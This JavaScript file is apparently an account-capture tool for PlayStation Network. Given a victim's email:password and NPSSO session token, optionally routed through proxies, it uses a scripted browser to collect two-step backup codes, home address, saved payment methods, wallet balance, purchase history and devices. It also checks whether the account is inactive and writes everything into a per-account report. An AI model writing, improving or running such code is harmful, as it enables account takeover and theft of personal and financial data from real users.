/**
 * PlayStation API Interaction Tool
 *
 * This module provides functionality to interact with PlayStation APIs
 * by managing browser sessions and cookies across multiple tabs.
 */

const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const axios = require("axios");
const { spawn } = require("child_process");
const path = require("path");
const https = require('https');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Target URLs to monitor
const TARGET_URLS = [
  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
  "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
  "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
  /\/twostepbackupcodes$/,
  "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
  "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments"
];

// Page configurations
const PAGE_CONFIGS = {
  FIRST: {
    url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
    name: "page1",
    waitTime: 15000,
  },
  SECOND: {
    url: "https://library.playstation.com/recently-purchased",
    name: "page2",
    waitTime: 10000,
  },
  API_URL:
    "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
};

/**
 * Test a proxy with the specified protocol
 * @param {string} proxyString - Proxy string in format host:port:username:password
 * @param {string} protocol - Protocol to test ('https' or 'socks5')
 * @returns {Promise<Object>} Test result object
 */
async function testProxy(proxyString, protocol = 'https') {
  try {
    const axios = require('axios');
    const { SocksProxyAgent } = require('socks-proxy-agent');
    const { HttpsProxyAgent } = require('https-proxy-agent');
    
    // Parse proxy string
    const proxy = parseProxyString(proxyString);
    if (!proxy) {
      return { success: false, error: 'Invalid proxy format' };
    }
    
    const { host, port, username, password } = proxy;
    
    let agent;
    let proxyUrl;
    
    if (protocol === 'socks5') {
      proxyUrl = `socks5://${encodeURIComponent(username)}:${encodeURIComponent(password)}@${host}:${port}`;
      agent = new SocksProxyAgent(proxyUrl);
    } else {
      proxyUrl = `http://${encodeURIComponent(username)}:${encodeURIComponent(password)}@${host}:${port}`;
      agent = new HttpsProxyAgent(proxyUrl);
    }
    
    // Test proxy with a request to a reliable endpoint
    const startTime = Date.now();
    const response = await axios.get('https://api.ipify.org?format=json', {
      httpsAgent: agent,
      timeout: 10000, // 10 seconds timeout
    });
    
    const responseTime = Date.now() - startTime;
    
    return {
      success: true,
      protocol,
      ip: response.data.ip,
      responseTime,
      message: `Proxy working with ${protocol}. Response time: ${responseTime}ms`
    };
  } catch (error) {
    return {
      success: false,
      protocol,
      error: error.message,
      message: `Proxy test failed with ${protocol}: ${error.message}`
    };
  }
}

/**
 * Creates the NPSSO cookie object
 * @param {string} npssoValue - The NPSSO value
 * @returns {Object} Cookie object for NPSSO
 */
function createNpssoCookie(npssoValue) {
  return {
    name: "npsso",
    value: npssoValue,
    domain: ".sonyentertainmentnetwork.com",
    path: "/",
    httpOnly: false,
    secure: true,
    sameSite: "None",
  };
}

/**
 * Formats cookies array into a string for HTTP headers
 * @param {Array} cookies - Array of cookie objects
 * @returns {string} Formatted cookie string
 */
function formatCookiesForHeader(cookies) {
  return cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join("; ");
}

/**
 * Ensures the target directory exists
 * @param {string} dirPath - Path to the directory
 * @returns {Promise<void>}
 */
async function ensureDirectoryExists(dirPath) {
  try {
    await fs.mkdir(dirPath, { recursive: true });
  } catch (error) {
    if (error.code !== "EEXIST") {
      throw error;
    }
  }
}

/**
 * Determines if a request is relevant for tracking
 * @param {string} url - The request URL
 * @returns {boolean} Whether the request should be tracked
 */
function isRelevantRequest(url) {
  const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
  return (
    (url.startsWith("http://") || url.startsWith("https://")) &&
    !staticResourceExtensions.some((ext) => url.includes(ext))
  );
}

/**
 * Determines if a response is relevant for processing
 * @param {string} url - The response URL
 * @returns {boolean} Whether the response should be processed
 */
function isRelevantResponse(url) {
  const ignoredResources = [
    ".ico",
    ".png",
    ".jpg",
    ".css",
    ".js",
    ".woff",
    ".woff2",
  ];
  return !ignoredResources.some((resource) => url.includes(resource));
}

/**
 * Extracts data from a response
 * @param {Object} response - Puppeteer response object
 * @param {Object} headers - Response headers
 * @returns {Promise<*>} Extracted response data
 */
async function extractResponseData(response, headers) {
  const contentType = headers["content-type"] || "";
  const textBasedTypes = ["json", "text", "html", "xml"];

  if (textBasedTypes.some((type) => contentType.includes(type))) {
    try {
      const text = await response.text();

      // Parse JSON if content type indicates JSON
      if (contentType.includes("json")) {
        try {
          return JSON.parse(text);
        } catch (e) {
          return text; // Return as text if JSON parsing fails
        }
      }
      return text;
    } catch (e) {
      return `Error getting response data: ${e.message}`;
    }
  } else {
    return `[Binary data with content-type: ${contentType}]`;
  }
}

/**
 * Extracts operation name from URL
 * @param {string} url - The request URL
 * @returns {string} Operation name or endpoint
 */
function extractOperationName(url) {
  const urlObj = new URL(url);

  if (urlObj.searchParams.has("operationName")) {
    return urlObj.searchParams.get("operationName");
  } else {
    // Use the last part of the path if no operationName
    const pathParts = urlObj.pathname.split("/");
    return pathParts[pathParts.length - 1];
  }
}

/**
 * Sets up request and response tracking for a page
 * @param {Object} page - Puppeteer page object
 * @param {string} npssoValue - NPSSO cookie value
 * @param {Array} targetUrls - URLs to monitor
 * @param {Object} finalResponses - Object to store processed responses
 * @param {Function} onProgress - Callback for progress updates
 * @param {Function} onData - Callback for data updates
 * @returns {Promise<void>}
 */
async function setupRequestAndResponseTracking(
  page,
  npssoValue,
  targetUrls,
  finalResponses,
  onProgress,
  onData
) {
  await page.setRequestInterception(true);
  const requestMap = new Map();

  page.on("request", (request) => {
    const url = request.url();
    const headers = request.headers();
    const method = request.method();
    const resourceType = request.resourceType();
    const postData = request.postData();
    let modified = false;

    requestMap.set(request._requestId, {
      url,
      method,
      headers,
      resourceType,
      postData,
      timestamp: new Date().toISOString(),
    });

    if (isRelevantRequest(url)) {
      if (headers.cookie) {
        if (!headers.cookie.includes("npsso=")) {
          headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
          modified = true;
        }
      } else {
        headers.cookie = `npsso=${npssoValue}`;
        modified = true;
      }
    }

    if (modified) {
      request.continue({ headers });
      onProgress(`Modified request to: ${url}`);
    } else {
      request.continue();
    }
  });

  page.on("response", async (response) => {
    try {
      const request = response.request();
      const url = response.url();
      const requestId = request._requestId;
      const requestInfo = requestMap.get(requestId);

      if (requestInfo && isRelevantResponse(url)) {
        const responseHeaders = response.headers();
        let responseData = await extractResponseData(response, responseHeaders);

        // Check if URL matches any target URL
        for (const targetUrl of targetUrls) {
          if (isMatchingTargetUrl(url, targetUrl)) {
            onProgress(`Found target request: ${url}`);

            const operationName = extractOperationName(url);
            console.log('operationName =======> ', operationName);

            processTargetResponse(operationName, responseData, finalResponses);
            onData(finalResponses);
            break;
          }
        }
      }
    } catch (error) {
      console.error(`Error processing response: ${error.message}`);
    } finally {
      requestMap.delete(response.request()._requestId);
    }
  });
}

/**
 * Checks if a URL matches a target URL pattern
 * @param {string} url - The URL to check
 * @param {string|RegExp} targetUrl - The target URL or pattern
 * @returns {boolean} Whether the URL matches
 */
function isMatchingTargetUrl(url, targetUrl) {
  if (targetUrl instanceof RegExp) {
    return targetUrl.test(url);
  }
  return url === targetUrl || url.startsWith(targetUrl);
}

/**
 * Processes target response data based on the operation
 * @param {string} operationName - The operation name
 * @param {Object} responseData - The response data
 * @param {Object} finalResponses - Object to store processed responses
 */
function processTargetResponse(operationName, responseData, finalResponses) {
  switch (operationName) {
    case "communication":
      if (responseData.realName) {
        finalResponses.profile = {
          ...(finalResponses.profile || {}),
          firstName: responseData.realName.name.first,
          lastName: responseData.realName.name.last,
        };
      }
      break;

    case "getProfileOracle":
      if (responseData.data?.oracleUserProfileRetrieve) {
        const profile = responseData.data.oracleUserProfileRetrieve;
        finalResponses.profile = {
          ...(finalResponses.profile || {}),
          name: profile.name,
          accountId: profile.accountId,
          age: profile.age,
          isOfficiallyVerified: profile.isOfficiallyVerified,
          isPsPlusMember: profile.isPsPlusMember,
          locale: profile.locale,
          onlineId: profile.onlineId,
        };
      }
      break;

    case "getPurchasedGameList":
      if (responseData.data?.purchasedTitlesRetrieve) {
        finalResponses.games =
          responseData.data.purchasedTitlesRetrieve.games.map((item) => ({
            name: item.name,
            platform: item.platform,
            membership: item.membership,
            isDownloadable: item.isDownloadable,
          }));
      }
      break;

    case "getUserDevices":
      if (responseData.data?.deviceStorageDetailsRetrieve) {
        finalResponses.devices =
          responseData.data.deviceStorageDetailsRetrieve.map((item) => ({
            name: item.deviceName,
            platform: item.devicePlatform,
          }));
      }
      break;

    case "twostepbackupcodes":
      if (responseData.backup_codes) {
        finalResponses.backupCodes = responseData.backup_codes.map(
          (item) => item.code
        );
      }
      break;

    case "addresses":
      if (responseData.length > 0) {
        const mainAddress = responseData.find((item) => item.isMain)
        finalResponses.address = { ...mainAddress }
      }
      break;
  }
}

/**
 * Creates and configures a new browser page
 * @param {Object} browser - Puppeteer browser instance
 * @param {Array} cookies - Cookies to set on the page
 * @param {string} npssoValue - NPSSO cookie value
 * @param {Array} targetUrls - URLs to monitor
 * @param {Object} finalResponses - Object to store processed responses
 * @param {string} pageName - Identifier for the page
 * @param {Function} onProgress - Callback for progress updates
 * @param {Function} onData - Callback for data updates
 * @param {Object} proxyConfig - Optional proxy configuration
 * @returns {Promise<Object>} Configured page
 */
async function createConfiguredPage(
  browser,
  cookies,
  npssoValue,
  targetUrls,
  finalResponses,
  pageName,
  onProgress,
  onData,
  proxyConfig = null
) {
  const page = await browser.newPage();

  // Set proxy authentication if provided
  if (proxyConfig && proxyConfig.username && proxyConfig.password) {
    await page.authenticate({
      username: proxyConfig.username,
      password: proxyConfig.password,
    });
  }

  // Set cookies if provided
  if (cookies && cookies.length > 0) {
    onProgress(`Transferring ${cookies.length} cookies to ${pageName}...`);
    await Promise.all(cookies.map((cookie) => page.setCookie(cookie)));
  } else if (npssoValue) {
    // Set just the NPSSO cookie if no cookies provided
    await page.setCookie(createNpssoCookie(npssoValue));
  }

  // Setup request tracking
  await setupRequestAndResponseTracking(
    page,
    npssoValue,
    targetUrls,
    finalResponses,
    onProgress,
    onData
  );

  // Set viewport
  await page.setViewport({ width: 1920, height: 1080 });

  return page;
}

/**
 * Navigates to a URL and waits for the page to load
 * @param {Object} page - Puppeteer page object
 * @param {string} url - URL to navigate to
 * @param {string} description - Description for logging
 * @param {Function} onProgress - Callback for progress updates
 * @returns {Promise<void>}
 */
async function navigateToPage(page, url, description, onProgress) {
  onProgress(`Opening ${description} (${url})...`);
  await page.goto(url, {
    waitUntil: "networkidle2",
    timeout: 60000,
  });
  onProgress(`${description} loaded successfully.`);
}

/**
 * Combines cookies from multiple pages, removing duplicates
 * @param {...Array} cookieArrays - Arrays of cookies to combine
 * @returns {Array} Combined unique cookies
 */
function combineUniqueCookies(...cookieArrays) {
  const cookieMap = new Map();

  for (const cookieArray of cookieArrays) {
    if (!cookieArray) continue; // Skip null/undefined arrays

    for (const cookie of cookieArray) {
      const key = `${cookie.name}:${cookie.domain}`;
      cookieMap.set(key, cookie);
    }
  }

  return Array.from(cookieMap.values());
}

/**
 * Waits for a specified time period
 * @param {number} ms - Time to wait in milliseconds
 * @param {string} reason - Reason for waiting (for logging)
 * @param {Function} onProgress - Callback for progress updates
 * @returns {Promise<void>}
 */
async function wait(ms, reason, onProgress) {
  onProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`);
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Generates formatted text for payment methods
 * @param {Object} response - Payment methods response data
 * @returns {string} Formatted payment methods text
 */
function generatePaymentMethodsText(response) {
  let paymentMethodsText = [];

  // Check credit cards
  if (response.creditCards) {
    response.creditCards.forEach(card => {
      if (card.common.isPaymentMethodAvailable && !card.common.banned) {
        let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
        paymentMethodsText.push(cardInfo);
      }
    });
  }

  // Check PayPal
  if (response.payPal && response.payPal.common.isPaymentMethodAvailable && !response.payPal.common.banned) {
    paymentMethodsText.push(`[PayPal]`);
  }

  return paymentMethodsText.join(" - ");
}

/**
 * Run the PlayStation API tool with the provided credentials
 * @param {Object} options - Tool options
 * @param {string} options.credentials - Combined email:password credentials
 * @param {string} options.npsso - NPSSO value
 * @param {string} options.proxyFile - Path to proxy file (optional)
 * @param {string} options.proxyData - Raw proxy data (optional)
 * @param {Function} options.onProgress - Progress callback
 * @param {Function} options.onData - Data update callback
 * @param {Function} options.onComplete - Completion callback
 * @param {Function} options.onError - Error callback
 */
async function runPsnApiTool(options) {
  const {
    credentials,
    npsso,
    proxyData,
    proxyProtocol = 'https', // پروتکل پیش‌فرض
    onProgress = () => { },
    onData = () => { },
    onComplete = () => { },
    onError = () => { },
  } = options;

  // Create a new object to store responses
  let finalResponses = {};
  let workingProxyConfig = null;

  try {
    let proxyConfig = null;
    if (proxyData) {
      const proxy = parseProxyString(proxyData);
      if (proxy) {
        const { host, port, username, password } = proxy;
        proxyConfig = {
          host,
          port,
          username,
          password,
          protocol: proxyProtocol || 'https'
        };
        onProgress(`Using ${proxyConfig.protocol} proxy: ${host}:${port}`);
      }
    }
  
    // Browser launch options
    const browserOptions = {
      headless: false,
      defaultViewport: null,
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    };
  
    // Add proxy args if configured
    if (proxyConfig) {
      if (proxyConfig.protocol === 'socks5') {
        browserOptions.args.push(`--proxy-server=socks5://${proxyConfig.host}:${proxyConfig.port}`);
      } else {
        browserOptions.args.push(`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`);
      }
    }
  
    let browser;
    try {
      // Launch browser
      onProgress("Launching browser...");
      browser = await puppeteer.launch(browserOptions);
      
      // Setup first page with proxy authentication if needed
      const page1 = await browser.newPage();
      
      // Important: Set proxy authentication BEFORE any navigation
      if (proxyConfig) {
        await page1.authenticate({
          username: proxyConfig.username,
          password: proxyConfig.password
        });
      }
      // Navigate to first page
      await navigateToPage(
        page1,
        PAGE_CONFIGS.FIRST.url,
        "the first page",
        onProgress
      );

      // Wait for first page to fully load and cookies to be set
      await wait(
        PAGE_CONFIGS.FIRST.waitTime,
        "for first page to fully load",
        onProgress
      );

      // Get cookies from first page
      const cookies = await page1.cookies();
      onProgress(`Retrieved ${cookies.length} cookies from the first page`);

      // Ensure NPSSO cookie is present
      const hasNpsso = cookies.some((cookie) => cookie.name === "npsso");
      if (!hasNpsso) {
        onProgress(
          "npsso cookie not found in the retrieved cookies. Adding it manually."
        );
        cookies.push(createNpssoCookie(npsso));
      }

      try {
        onProgress('Attempting to click on the specified element...');
        await page1.waitForXPath('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div', { timeout: 10000 });
        const [element] = await page1.$x('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div');

        if (element) {
          onProgress('Element found. Clicking...');
          await element.click();
          onProgress('Click successful.');

          // Wait after click to allow any actions to complete
          await wait(3000, 'after clicking the element', onProgress);

          // Code for second click with corrected XPath
          // Wait for navigation after first click
          onProgress('Waiting for navigation after first click...');
          try {
            // Wait for potential navigation to complete
            await page1.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {
              onProgress('No navigation occurred or navigation already completed.');
            });

            // Wait a bit for the new page to stabilize
            await wait(5000, 'for the new page to stabilize after navigation', onProgress);

            // Now try to find and click the element with the specified XPath
            onProgress('Attempting to find and click on element with XPath: //*[@id="ember138"]/div/div/div/div[1]/div');

            // Wait for the element to be available in the DOM
            await page1.waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', { timeout: 15000 }).catch(e => {
              onProgress(`Element with specified XPath not found in time: ${e.message}`);
            });

            // Try to find the element
            const [secondElement] = await page1.$x('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div');

            if (secondElement) {
              onProgress('Found element with specified XPath. Clicking...');
              await secondElement.click();
              onProgress('Successfully clicked on the second element.');

              // Wait after second click to allow any actions to complete
              await wait(5000, 'after clicking the second element', onProgress);
            } else {
              onProgress('Element with specified XPath not found. Continuing with the process.');
            }
          } catch (error) {
            onProgress(`Error while handling second click: ${error.message}`);
            // Continue with the process even if this step fails
          }
        } else {
          onProgress('Element not found with the specified XPath.');
        }
      } catch (error) {
        onProgress(`Error while trying to click the element: ${error.message}`);
      }

      // Setup second page
      const page2 = await createConfiguredPage(
        browser,
        cookies,
        npsso,
        TARGET_URLS,
        finalResponses,
        PAGE_CONFIGS.SECOND.name,
        onProgress,
        onData,
        workingProxyConfig
      );

      // Navigate to second page
      await navigateToPage(
        page2,
        PAGE_CONFIGS.SECOND.url,
        "the second page",
        onProgress
      );

      // Wait and reload second page
      await wait(
        PAGE_CONFIGS.SECOND.waitTime,
        "before reloading the second page",
        onProgress
      );

      await navigateToPage(
        page2,
        PAGE_CONFIGS.SECOND.url,
        "the second page (reload 1)",
        onProgress
      );

      await wait(PAGE_CONFIGS.SECOND.waitTime, "after reload", onProgress);

      await navigateToPage(
        page2,
        PAGE_CONFIGS.SECOND.url,
        "the second page (reload 2)",
        onProgress
      );

      await wait(15000, "for final page processing", onProgress);

      // Get final cookies from all pages
      onProgress("Getting final cookies from all pages...");
      const finalPage1Cookies = await page1.cookies();
      const finalPage2Cookies = await page2.cookies();

      onProgress(
        `Retrieved cookies: page1=${finalPage1Cookies.length}, page2=${finalPage2Cookies.length}`
      );

      // Combine all cookies
      const allCookies = combineUniqueCookies(
        finalPage1Cookies,
        finalPage2Cookies
      );

      onProgress(`Combined unique cookies: ${allCookies.length}`);

      // Configure axios for API requests
      let axiosConfig = {
        headers: {
          Cookie: allCookies
            .map((cookie) => `${cookie.name}=${cookie.value}`)
            .join("; "),
        }
      };

      // Add proxy to axios config if available
      if (workingProxyConfig) {
        if (workingProxyConfig.protocol === 'socks5') {
          const proxyUrl = `socks5://${workingProxyConfig.username ? `${workingProxyConfig.username}:${workingProxyConfig.password}@` : ''}${workingProxyConfig.host}:${workingProxyConfig.port}`;
          axiosConfig.httpsAgent = new SocksProxyAgent(proxyUrl);
        } else {
          const proxyUrl = `http://${workingProxyConfig.username ? `${workingProxyConfig.username}:${workingProxyConfig.password}@` : ''}${workingProxyConfig.host}:${workingProxyConfig.port}`;
          axiosConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
        }
      }

      // Make API requests with the configured axios
      const creditCards = await axios.get(
        "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
        axiosConfig
      );

      console.log(' ========> ', creditCards);

      finalResponses = {
        ...finalResponses,
        creditCards: generatePaymentMethodsText(creditCards.data),
      };

      const wallets = await axios.get(
        "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
        axiosConfig
      );

      finalResponses = { ...finalResponses, wallets: wallets.data };

      const transactions = await axios.get('https://web.np.playstation.com/api/graphql/v1/transact/transaction/history', {
        ...axiosConfig,
        params: {
          limit: 25,
          startDate: '2010-01-01T00:00:00.000-0400',
          endDate: '2025-04-06T23:59:59.999-0400',
          includePurged: false,
          transactionTypes: [
            'CREDIT',
            'CYCLE_SUBSCRIPTION',
            'DEBIT',
            'DEPOSIT_CHARGE',
            'DEPOSIT_VOUCHER',
            'PRODUCT_PURCHASE',
            'REFUND_PAYMENT_CHARGE',
            'REFUND_PAYMENT_WALLET',
            'VOUCHER_PURCHASE',
            'WALLET_BALANCE_CONVERSION',
          ].join(',')
        }
      });

      finalResponses = {
        ...finalResponses,
        transactionNumbers: transactions.data.transactions.length,
        trans: transactions.data.transactions
          .filter(
            (t) =>
              t.additionalInfo?.orderItems?.[0]?.totalPrice &&
              Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0
          )
          .map((t) => {
            const fullSkuId = t.additionalInfo.orderItems[0].skuId;
            const formattedSkuId = fullSkuId.match(
              /([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/
            )?.[0] || fullSkuId;
            return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo.orderItems[0].totalPrice.formattedValue
              }] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1
              }/${new Date(
                t.transactionDetail.transactionDate
              ).getDate()}/${new Date(
                t.transactionDetail.transactionDate
              ).getFullYear()} ]`;
          })
          .join("\n"),
      };

      const pythonProcess = spawn("python3", ["get_devices.py", npsso]);

      let result = "";
      let error = "";

      pythonProcess.stdout.on("data", (data) => {
        result += data.toString();
      });

      pythonProcess.stderr.on("data", (data) => {
        error += data.toString();
      });

      pythonProcess.on("close", async (code) => {
        if (code !== 0) {
          console.error(`Error running Python:`, error);
          onError(new Error(`Error running Python: ${error}`));
          return;
        }

        try {
          finalResponses = {
            ...finalResponses,
            newDevices: JSON.parse(result),
          };

          console.log(finalResponses);

          let hasSixMonthsPassed = false;
          if (finalResponses.newDevices && finalResponses.newDevices.length > 0) {
            const latestDevice = finalResponses.newDevices.reduce((latest, current) =>
              new Date(current.activationDate) > new Date(latest.activationDate) ? current : latest
            );
            hasSixMonthsPassed = new Date(latestDevice.activationDate) < new Date(new Date().setMonth(new Date().getMonth() - 6));
          }

          console.log('hasSixMonthsPassed  ', hasSixMonthsPassed);

          // Create final output as text
          const output = `
----------------------- « Account Info » -----------------------
- Account : ${credentials}
- Npsso : ${npsso}
- Backup Codes :  [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(' - ') : 'N/A'} ]
--------------------------- « Details » --------------------------
- Country | City | Postal Code : ${finalResponses.address?.country || 'N/A'} - ${finalResponses.address?.city || 'N/A'} - ${finalResponses.address?.postalCode || 'N/A'}
- Balance : ${finalResponses.wallets?.debtBalance || '0'}.${finalResponses.wallets?.currentAmount || '0'} ${finalResponses.wallets?.currencyCode || ''}
- PSN ID : ${finalResponses.profile?.onlineId || 'N/A'}
- Payments : ${finalResponses.creditCards || 'N/A'} 
- PS Plus : ${finalResponses.profile?.isPsPlusMember ? 'Yes!' : 'No!'}
- Devices : [ ${finalResponses.newDevices ? [...new Set(finalResponses.newDevices.map(d => d.deviceType))].join(' - ') : 'N/A'} ]
- Deactive : ${hasSixMonthsPassed === false ? 'No!' : 'Yes!'}
- Transaction Numbers : ${finalResponses.transactionNumbers || 'N/A'}
--------------------------- « Games » ---------------------------
${finalResponses.trans || 'No games found'}
--------------------------- « Finish » ----------------------------
`;

          // Save output to file
          try {
            // Extract email from credentials
            const email = credentials.split(':')[0];

            // Create filename with requested format
            const date = new Date().toISOString().split('T')[0]; // Format YYYY-MM-DD
            const fileName = `${email}-${date}.txt`;

            // Ensure directory exists for saving files
            const outputDir = path.join(__dirname, 'output');
            await ensureDirectoryExists(outputDir);

            // Write output to file
            const filePath = path.join(outputDir, fileName);
            await fs.writeFile(filePath, output, 'utf8');

            onProgress(`Output saved to file ${fileName}.`);

            // Add file path to final responses
            finalResponses.outputFilePath = filePath;
            finalResponses.formattedOutput = output;

          } catch (fileError) {
            onProgress(`Error saving output file: ${fileError.message}`);
          }

          // Process completed successfully
          onProgress("Processing completed successfully");
          onComplete({
            ...finalResponses,
            formattedOutput: output,
            usedProxy: workingProxyConfig ? `${workingProxyConfig.host}:${workingProxyConfig.port} (${workingProxyConfig.protocol})` : 'None'
          });
        } catch (e) {
          console.error("Error converting output:", e);
          console.log("Raw output:", result);
          onError(e);
        }
      });

    } finally {
      // Close the browser
      if (browser) {
        await browser.close();
        onProgress("Browser closed.");
      }
    }
  } catch (error) {
    onProgress(`Error occurred: ${error.message}`);
    onError(error);
  }
}

/**
 * Parse proxy string properly
 * @param {string} proxyString - Proxy string in format host:port:username:password
 * @returns {Object|null} Parsed proxy object or null if invalid
 */
function parseProxyString(proxyString) {
  if (!proxyString || typeof proxyString !== 'string') return null;
  
  const parts = proxyString.trim().split(':');
  if (parts.length !== 4) return null;
  
  const [host, port, username, password] = parts;
  return {
    host,
    port,
    username,
    password
  };
}
/**
 * Test a proxy with the specified protocol
 * @param {string} proxyString - Proxy string in format host:port:username:password
 * @param {string} protocol - Protocol to test ('https' or 'socks5')
 * @returns {Promise<Object>} Test result object
 */
async function testProxy(proxyString, protocol = 'https') {
  try {
    const axios = require('axios');
    const { SocksProxyAgent } = require('socks-proxy-agent');
    const { HttpsProxyAgent } = require('https-proxy-agent');

    // Parse proxy string
    const proxy = parseProxyString(proxyString);
    if (!proxy) {
      return { success: false, error: 'Invalid proxy format' };
    }

    const { host, port, username, password } = proxy;

    let agent;
    let proxyUrl;

    if (protocol === 'socks5') {
      proxyUrl = `socks5://${encodeURIComponent(username)}:${encodeURIComponent(password)}@${host}:${port}`;
      agent = new SocksProxyAgent(proxyUrl);
    } else {
      proxyUrl = `http://${encodeURIComponent(username)}:${encodeURIComponent(password)}@${host}:${port}`;
      agent = new HttpsProxyAgent(proxyUrl);
    }

    // Test proxy with a request to a reliable endpoint
    const startTime = Date.now();
    const response = await axios.get('https://api.ipify.org?format=json', {
      httpsAgent: agent,
      timeout: 10000, // 10 seconds timeout
    });

    const responseTime = Date.now() - startTime;

    return {
      success: true,
      protocol,
      ip: response.data.ip,
      responseTime,
      message: `Proxy working with ${protocol}. Response time: ${responseTime}ms`
    };
  } catch (error) {
    return {
      success: false,
      protocol,
      error: error.message,
      message: `Proxy test failed with ${protocol}: ${error.message}`
    };
  }
}

module.exports = { runPsnApiTool, testProxy };